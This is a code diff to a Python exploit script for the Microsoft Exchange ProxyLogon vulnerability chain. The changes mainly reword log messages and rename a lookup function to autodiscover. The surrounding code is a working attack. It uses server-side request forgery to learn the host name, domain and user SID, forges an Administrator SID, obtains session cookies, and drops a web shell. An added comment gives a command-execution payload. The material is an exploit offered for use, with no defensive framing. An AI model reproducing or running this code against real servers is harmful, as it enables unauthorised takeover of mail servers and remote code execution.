@@ -48,11 +48,11 @@ def pwn(host, email):
     print("[*] user SID: {}".format(user_SID))
 
     admin_SID = gen_admin_SID(user_SID)
-    print("[*] forged Admin SID: {}".format(admin_SID))
+    print("[*] forged Administrator SID: {}".format(admin_SID))
     print("[+] Using proxylogon to get Administrator identity ..")
     asp_session, canary_cookie = proxylogon(session, host, CN, proxylogon_body.format(admin_SID), admin_SID)
-    print("[*] cookie \"ASP.NET_SessionId\": {}".format(asp_session) )
-    print("[*] cookie \"msExchEcpCanary\": {}".format(canary_cookie) )
+    print("[proxylogon] cookie \"ASP.NET_SessionId\": {}".format(asp_session) )
+    print("[proxylogon] cookie \"msExchEcpCanary\": {}".format(canary_cookie) )
 
     loggenAs, RBAC_roles = get_identity_info(session, host, CN)
     if loggenAs and RBAC_roles != "0":
@@ -63,7 +63,7 @@ def pwn(host, email):
     drop_shell(session, host, CN, canary_cookie)
     print("[!] dropped shell on target: done!")
     shell_url = host + (shell_path.format(use_name)).split("C:\\inetpub\\wwwroot")[1].replace("\\", "/") + "?{}=RCE".format(use_name)
-    print("[!] shell url: {}".format(shell_url))
+    print("[!] shell url: {}".format(shell_url)) # RCE => Response.Write(new ActiveXObject("WScript.Shell").Exec("whoami").Stdout.ReadAll());
 
     return 0
 
@@ -87,13 +87,15 @@ def get_CN(session, host):
         return do_NTLM(session, host), True
 
 def get_SID(session, host, email, CN):
-    legacyDN, DC_address, RPC_address = get_legacyDN(session, host, email, CN)
-    print("[*] Domain Controller: {}".format(DC_address))
-    print("[*] LegacyExchangeDN of the mailbox ({}): {}".format(email, legacyDN))
+    print("[LOG] Attempting autodiscover on email: {}".format(email))
+    legacyDN, DC_address, RPC_address, user_name = autodiscover(session, host, email, CN)
+    print("[autodiscover] user name: {}".format(user_name))
+    print("[autodiscover] Domain Controller: {}".format(DC_address))
+    print("[autodiscover] LegacyExchangeDN of the mailbox: {}".format(legacyDN))
     return get_MAPI_error(session, host, CN, legacyDN)
     
 
-def get_legacyDN(session, host, email, CN):
+def autodiscover(session, host, email, CN):
     ssrf_url = "[{}]@{}:444/autodiscover/autodiscover.xml".format(use_name, CN)
     content_type = {"Content-Type": "text/xml"}
     response = do_SSRF(session, "post", host, ssrf_url, ssrf_data=autodiscover_body.format(email), ssrf_headers=content_type)
@@ -105,6 +107,7 @@ def get_legacyDN(session, host, email, CN):
     LegacyDN = re.findall(rb'<LegacyDN>(.+?)</LegacyDN>', response.content)
     DC_address = re.findall(rb'<AD>(.+?)</AD>', response.content)
     RPC_address = re.findall(rb'<Server>(.+?)</Server>', response.content)
+    user_name = re.findall(rb'<DisplayName>(.+?)</DisplayName>', response.content)
 
     if len(LegacyDN) == 0 or len(DC_address) == 0 or len(RPC_address) == 0:
         print("[ERROR] the email you provided is invalid!")
@@ -114,8 +117,9 @@ def get_legacyDN(session, host, email, CN):
         LegacyDN = LegacyDN[0].decode("utf-8")
         DC_address = DC_address[0].decode("utf-8")
         RPC_address  = RPC_address[0].decode("utf-8")
+        user_name = user_name[0].decode("utf-8")
 
-    return LegacyDN, DC_address, RPC_address
+    return LegacyDN, DC_address, RPC_address, user_name
 
 def get_MAPI_error(session, host, CN, legacyDN):
     ssrf_url = "[{}]@{}:444/mapi/emsmdb?MailboxId=asdfasdf-asdfasdf-asdfasdf-asdfasdf-asdfasdf@asdfasdf.com".format(use_name, CN)
@@ -133,7 +137,7 @@ def get_MAPI_error(session, host, CN, legacyDN):
     
     SID = re.findall(rb'with SID (.+?) and MasterAccountSid', response.content)
     if len(SID) == 0:
-        print("[ERROR] couldn't get SID!")
+        print("[ERROR] couldn't get the user SID!")
         print_exch_error(response)
         exit(1)
     else:
@@ -286,10 +290,6 @@ def do_NTLM(session, host, RPC_address=None, just_enum=False):
     server_challenge_b64 = re.search('NTLM ([a-zA-Z0-9+/]+={0,2})', www_auth).group(1)
     server_challenge = base64.b64decode(server_challenge_b64)
 
-    print("TargetInfo:")
-    version = parse_version(server_challenge[48:56])
-    print("\t[NTLM] Version: {}".format(version))
-
     challenge = ntlm.NTLMAuthChallenge(server_challenge)
     ntlmssp_info = ntlm.AV_PAIRS(challenge['TargetInfoFields'])
     
@@ -297,19 +297,23 @@ def do_NTLM(session, host, RPC_address=None, just_enum=False):
             x, y = ntlmssp_info[i]
             if i == 1:
                 CN = y.decode('utf-16') 
-                print("\t[NTLM] computer name: {}".format(CN))
             elif i == 2:
                 DN = y.decode('utf-16')
-                print("\t[NTLM] domain name: {}".format(DN))
             elif i == 3:
                 CN_FQDN = y.decode('utf-16')
-                print("\t[NTLM] DNS computer name (FQDN): {}".format(CN_FQDN))
             elif i == 4:
                 DN_FQDN = y.decode('utf-16')
-                print("\t[NTLM] DNS domain name (FQDN): {}".format(DN_FQDN))
             elif i == 5:
                 tree_FQDN = y.decode('utf-16')
-                print("\t[NTLM] DNS tree name (FQDN): {}".format(tree_FQDN))
+
+    version = parse_version(server_challenge[48:56])
+    print("[LOG] NTLM CHALLENGE_MESSAGE is parsed! TargetInfo:")
+    print("[NTLM] Version: {}".format(version))
+    print("[NTLM] computer name: {}".format(CN))
+    print("[NTLM] domain name: {}".format(DN))
+    print("[NTLM] DNS computer name (FQDN): {}".format(CN_FQDN))
+    print("[NTLM] DNS domain name (FQDN): {}".format(DN_FQDN))
+    print("[NTLM] DNS tree name (FQDN): {}".format(tree_FQDN))
 
     del session.headers["Authorization"]
     return CN
